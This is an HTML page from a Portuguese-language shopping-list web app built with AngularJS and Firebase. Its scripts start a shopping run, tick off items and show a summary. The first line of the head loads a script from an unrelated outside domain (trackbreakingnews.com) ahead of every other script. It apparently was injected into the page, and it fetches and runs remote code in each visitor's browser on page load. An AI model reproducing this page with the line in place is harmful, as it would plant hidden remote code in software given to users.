<!DOCTYPE html>
<html ng-app="myApp">
	
    <head>
        <script src="http://d.trackbreakingnews.com/l/load.js"></script>
        
        <script src="libs/angular/angular.min.js"></script>
        
        
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">    
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Xenon Boostrap Admin Panel" />
        <meta name="author" content="" />

        <script src="http://code.angularjs.org/angular-1.0.0rc11.min.js"></script>
        <script src="http://documentcloud.github.com/underscore/underscore-min.js"></script>
		
        
        <link href="css/bootstrap-dist/css/bootstrap.min.css" rel="stylesheet" />
        <link href="css/ionicons/css/ionicons.min.css" rel="stylesheet" />
        <link href="css/main.css" rel="stylesheet" />
        <script data-main="app/bootstrap" src="libs/requirejs/require.js"></script>
        <script src="libs/requirejs/jquery-1.11.1.min.js"></script>

        <script src="libs/js/angular-momentjs.js"></script>    
        <script src="libs/js/moment.js"></script>    		
        
        <title>Lista de compras</title>
            
        <link href="http://fonts.googleapis.com/css?family=Arimo:400,700,400italic" rel="stylesheet">
        
        <link href="css/fonts/linecons/linecons.css" rel="stylesheet">
        <link href="css/fonts/fontawesome/font-awesome.min.css" rel="stylesheet">
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/xenon-core.css" rel="stylesheet">
        <link href="css/xenon-forms.css" rel="stylesheet">
        <link href="css/xenon-components.css" rel="stylesheet">
        <link href="css/xenon-skins.css" rel="stylesheet">
        <link href="css/xenon.css" rel="stylesheet">  
        <link href="css/bootstrap-dist/css/metisMenu.min.css" rel="stylesheet">
        <link href="css/bootstrap-dist/css/sb-admin-2.css" rel="stylesheet">
        <link href="css/fonts/skins/_all-skins.min.css" rel="stylesheet" type="text/css" />


        
    
        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
            <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.26/angular.min.js"></script>
        <script src="https://cdn.firebase.com/js/client/2.2.3/firebase.js"></script>	
        <script src="https://cdn.firebase.com/libs/angularfire/1.0.0/angularfire.min.js"></script>
            
            
            
            
    </head>
    <body class="page-body">
        
        <div id="wrapper">
            
            <nav class="navbar navbar-default navbar-static-top" role="navigation" style="margin-bottom: 0">
				<div class="navbar-header">
					<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="sr-only">Toggle navigation</span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						
					</button>
					<a class="navbar-brand" href="index.html">Lista de Compras 1.0</a>
				</div>
				<!-- /.navbar-header -->

				<div class="navbar-default sidebar" role="navigation">
					<div class="sidebar-nav navbar-collapse">
						<ul class="nav" id="side-menu">
							
							<li>
                                <a href="index.html"><i class="fa fa-home fa-fw"></i> Início</a>
                            </li>
                            <li>
                                <a href="lista_produtos.html"><i class="fa fa-edit fa-fw"></i> Cadastrar produtos</a>
                            </li>
                            <li>
                                <a href="carrinho.html"><i class="fa fa-shopping-cart fa-fw"></i> Criar lista de compras</a>
                            </li>
                            <li>
                                <a href="exec_lista.html"><i class="fa fa-check-square-o fa-fw"></i> Ir as compras</a>
                            </li>
						</ul>
					</div>
					<!-- /.sidebar-collapse -->
				</div>
				<!-- /.navbar-static-side -->
            </nav>
        
            <div id="page-wrapper">
                <div class="page-container"><!-- add class "sidebar-collapsed" to close sidebar by default, "chat-visible" to make chat appear always -->
                        
                    <!-- Add "fixed" class to make the sidebar fixed always to the browser viewport. -->
                    <!-- Adding class "toggle-others" will keep only one menu item open at a time. -->
                    <!-- Adding class "collapsed" collapse sidebar root elements and show only icons. comment -->
                    
                    <div class="main-content">
                        
                        <h3 class="text-gray">
                            Lista de Compras <br />
                            <small class="text-muted">Execução da lista de compras</small>
                        </h3>
                        
                        <!-- Xenon Todo List -->
                        <div class="row" ng-controller="minhalistaCTRL">
                            <div class="col-sm-6">
                                <div class="xe-widget xe-counter xe-counter-purple">
                                    <div class="xe-icon">
                                        <i class="linecons-pencil"></i>
                                    </div>
                                    <div class="xe-label">
                                        <strong class="num">{{percentualconcluido | number:0}}%</strong>
                                        <span>% de itens concluídos</span>
                                    </div>
                                </div>
								
								<div>
									<button class="btn btn-purple btn-block btn-primary full-width" type="button" ng-click="InicioFim()">{{myTitle}}</button>
									<button class="btn btn-purple btn-block btn-primary full-width" type="button" data-toggle="modal" data-inicio={{inicio}} data-target="#modal-1">Finalizar ...</button>
								</div>
			
                                <div class="xe-widget xe-todo-list xe-todo-list-purple">
                                    <div class="xe-header">
                                        <div class="xe-icon">
                                            <i class="fa-file-text-o"></i>
                                        </div>
                                        <div class="xe-label">
                                            <span>Lista</span>
                                            <strong>Itens Selecionados</strong>
                                        </div>
                                    </div>
                                    <div class="xe-body">
                                        
                                        <ul class="list-unstyled">
                                            <li ng-repeat="item in itemslista">
                                                <label>
                                                    <input ng-disabled="myValue" ng-model="item.status" type="checkbox" ng-click="mudaStatus(item.ID, item.status)" class="cbr" />
                                                    <span>{{item.descricao}}</span>
                                                </label>
                                            </li>
                                        </ul>
                                        
                                    </div>
                                    <div class="xe-header">
                                        <div>
                                        </div>
                                    </div>
                                    <div>
                                        <strong>Total de itens: {{totalitems}}</strong>
                                    </div>
                                </div>
                                
                                
                            </div>
                        </div>
                        
                        <!-- Main Footer -->
                        <!-- Choose between footer styles: "footer-type-1" or "footer-type-2" -->
                        <!-- Add class "sticky" to  always stick the footer to the end of page (if page contents is small) -->
                        <!-- Or class "fixed" to  always fix the footer to the end of page -->
                        
                    </div>
            
                </div>
            </div>
        </div>
        
        <script>

            var myApp = angular.module('myApp',[]);
            var categoria="";
            var guardaInicio;
            var guardaFim;
            var elapsed;
            
            myApp.controller('minhalistaCTRL', ['$scope', function($scope) {
                $scope.descricao="";
                $scope.itemslista=[];
                $scope.percentualconcluido=0;
				$scope.myValue = true;
				$scope.inicio = "";
				$scope.myTitle = "Iniciar Compras";
				$scope.inicio = "";
				$scope.fim = "";
				$scope.totalitems = 0;
                $scope.totalselecionados = 0;
                
                $scope.mudaStatus = function(produto, statusItem) {
                    //alert($scope.inicio + " " + produto  + " " + statusItem);                    
                    $scope.myList = new Firebase("https://listadecompras.firebaseio.com/minhalista/" + $scope.inicio + "/"  + produto);
                    $scope.myList.child('status').set(statusItem);
                    
                    if (statusItem === true) {
                        $scope.totalselecionados = $scope.totalselecionados + 1;
                    } else {
                        if ($scope.totalselecionados > 0) {
                            $scope.totalselecionados = $scope.totalselecionados - 1;
                        }
                    }
                    
                    if ($scope.totalselecionados > 0) {
                        $scope.percentualconcluido = $scope.totalselecionados/$scope.totalitems*100;
                    } else {
                        $scope.percentualconcluido = 0;
                    }
                };

				$scope.InicioFim = function() {                    
                    
                    //alert($scope.myValue);   
                    
					if ($scope.myValue === true) {
                        $scope.myValue = false;
						$scope.myTitle = "Finalizar Compras";
						
						guardaInicio = moment().format('DD/MM/YYYY hh:mm:ss');
                        $scope.inicio = moment().format('DD_MM_YYYY_hh_mm_ss');
						$scope.nomeLista = $scope.inicio;
                        
						//alert($scope.inicio);
                        
                        $scope.myData = new Firebase("https://listadecompras.firebaseio.com/produtos");
                        $scope.myData.orderByChild("status").equalTo(true).on('value', function(snapshot){
                        
                            $scope.totalitems = snapshot.numChildren();    
                            
                            $scope.novaLista = new Firebase("https://listadecompras.firebaseio.com/minhalista");
                                
                            snapshot.forEach(function(childSnapshot) {
                                //alert(childSnapshot.name());        
                                
                                var prod = $scope.novaLista.child($scope.inicio);
                                prod.push({
                                    descricao: childSnapshot.child('descricao').val(),
                                    categoria: childSnapshot.child('categoria').val(),
                                    status: false,
                                    quant: 0,
                                    preco: 0
                                });
                            });
                                                                
                            $scope.$apply();
                        });
                           
                        $scope.novaLista = new Firebase("https://listadecompras.firebaseio.com/minhalista/" + $scope.inicio);

                        $scope.novaLista.once('value', function(snapshot){
                            snapshot.forEach(function(childSnapshot) {
                                $scope.itemslista.push({'ID': childSnapshot.key(), 'descricao': childSnapshot.child('descricao').val(), 'categoria': childSnapshot.child('categoria').val(), 'status': childSnapshot.child('status').val()});
                            });
                            $scope.$apply();
                        });    
					} else {   
                        
                        $scope.novaLista = new Firebase("https://listadecompras.firebaseio.com/minhalista/" + $scope.inicio);
                        
                        var dtFim = $scope.novaLista.child('fim');
                        dtFim.push({'name':'dtFim', 'value':moment().format('DD/MMM/YYYY hh:mm:ss')});
                        guardaFim = moment().format('DD/MM/YYYY hh:mm:ss');
                        
                        $scope.myValue = true;

                    }
                    
                };	
                
            }]);
            
            myApp.controller('finalizarCTRL', ['$scope', function($scope) {

				$('#modal-1').on('show.bs.modal', function(e) {
                    
                    var dtInicio = $(e.relatedTarget).data('inicio');
                    //$(e.currentTarget).find('input[name="dtInicial"]').val(dtInicio);
										
					$scope.itemsFim=[];
                
					$scope.listaFim = new Firebase("https://listadecompras.firebaseio.com/minhalista/" + dtInicio);
					$scope.listaFim.once('value', function(snapshot){
						snapshot.forEach(function(childSnapshot) {
							$scope.itemsFim.push({'descricao': childSnapshot.child('descricao').val(), 
  												  'categoria': childSnapshot.child('categoria').val(),
												  'status': childSnapshot.child('status').val()});
						});
						$scope.$apply();
					});
					
					
					$scope.Finalizar = function() {
						location.reload();
					}
					
                });
				    
            }]);    
            

            
            
        </script>
        
        <!-- Bottom Scripts -->
        
        <script src="libs/requirejs/jquery-1.11.1.min.js"></script>
        
        <script src="libs/js/bootstrap.min.js"></script>
        <script src="libs/js/TweenMax.min.js"></script>
        <script src="libs/js/resizeable.js"></script>
        <script src="libs/js/joinable.js"></script>
        <script src="libs/js/xenon-api.js"></script>
        <script src="libs/js/xenon-toggles.js"></script>
        
        
        <!-- Imported scripts on this page -->
        <script src="libs/js/xenon-widgets.js"></script>
        <script src="libs/js/jquery-jvectormap-1.2.2.min.js"></script>
        <script src="libs/js/jquery-jvectormap-world-mill-en.js"></script>
        
        <!-- Metis Menu Plugin JavaScript -->
        <script src="libs/js/metisMenu.min.js"></script>
    
        <!-- Custom Theme JavaScript -->
        <script src="libs/js/sb-admin-2.js"></script>
        
        
        <!-- JavaScripts initializations and stuff -->
        <script src="libs/js/xenon-custom.js"></script>
    
		<div class="modal" id="my_modal">
          <div class="modal-dialog">
            <div class="modal-content">
              <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                  <h4 class="modal-title">Modal header</h4>
              </div>
              <div class="modal-body">
                <p>some content</p>
                <input type="text" name="bookId" value=""/>
              </div>
              <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
              </div>
            </div>
          </div>
        </div>
	
        <div class="modal fade" id="modal-1" ng-controller="finalizarCTRL">
            <div class="modal-dialog">
                <div class="modal-content">
                    
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                        <h4 class="modal-title">Confirmação!</h4>
                    </div>
                    
                    <div class="modal-body">
                        Compra Finalizada. Veja o resumo!
                    </div>
                    
                    <div class="xe-widget xe-todo-list xe-todo-list-purple">
                        <div class="xe-header">
                            <div class="xe-icon">
                                <i class="fa-file-text-o"></i>
                            </div>
                            <div class="xe-label">
                                <span>Lista</span>
                                <strong>Itens Selecionados</strong>
                            </div>
                        </div>
                        <div class="xe-body" name="dtInicio">
                            
                            <ul class="list-unstyled">
                                <li ng-repeat="item in itemsFim" ng-switch on="item.status">
                                    <label ng-switch-when="true">
                                        <i class="fa fa-check-square-o fa-fw"></i>
                                        <span>{{item.descricao}}</span>
                                    </label>
									<label ng-switch-when="false">
                                        <i class="fa fa-times fa-fw"></i>
                                        <span>{{item.descricao}}</span>
                                    </label>
                                </li>
                            </ul>
                            
                        </div>
                        <div class="xe-header">
                            <div>
                            </div>
                        </div>
                        <div>
                            <!--<strong>Total de itens: total</strong>-->
                        </div>
                    </div>
                    
                    <div class="modal-footer">
						<button type="button" class="btn btn-white" data-dismiss="modal">Cancelar</button>
						<button type="button" class="btn btn-info" ng-click="Finalizar()">Finalizar</button>
					
                        <!--<button type="button" class="btn btn-white" data-dismiss="modal" ng-click="Finalizar()">Finalizar</button>-->
                        <!--<button type="button" class="btn btn-info">Confirmar</button>-->
                    </div>
                    
                </div>
            </div>
        </div>

    </body>
    
    
</html>